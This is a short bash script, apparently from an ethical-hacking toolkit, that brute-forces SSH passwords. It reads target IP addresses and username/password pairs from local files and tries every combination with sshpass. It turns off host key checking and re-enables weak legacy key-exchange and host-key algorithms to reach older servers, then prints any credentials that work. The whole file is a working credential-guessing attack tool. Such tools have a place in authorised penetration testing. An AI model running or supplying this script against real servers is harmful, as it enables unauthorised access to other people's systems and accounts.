#!/bin/bash
#------------------------------------------------------------------------------
# Name        : ssh_bruteforce.sh
# Description : Bruteforce passwords on ssh in keyboard-interactive mode
# Author      : Lisandre.com
# Date        : 2019-12-20
# Prereq      : apt install sshpass
#------------------------------------------------------------------------------
CREDS_FILE=~/eh-tools/creds/creds_linux.txt

# Loop on IPs
for IP in $(cat ~/eh-tools/config/IPs.txt | grep -v '#'); do
    echo "Trying ${IP}..."

    # Loop on username/password pairs
    for line in $(cat $CREDS_FILE | grep '/' | grep -v '#'); do
        USERNAME="`echo $line | cut -d '/' -f1`"
        PASSWORD="`echo $line | cut -d '/' -f2`"

        #echo "Trying $USERNAME with $PASSWORD ..."
        sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss ${USERNAME}@${IP} echo "${IP}:${USERNAME}/${PASSWORD}"
    done

    echo " "
done

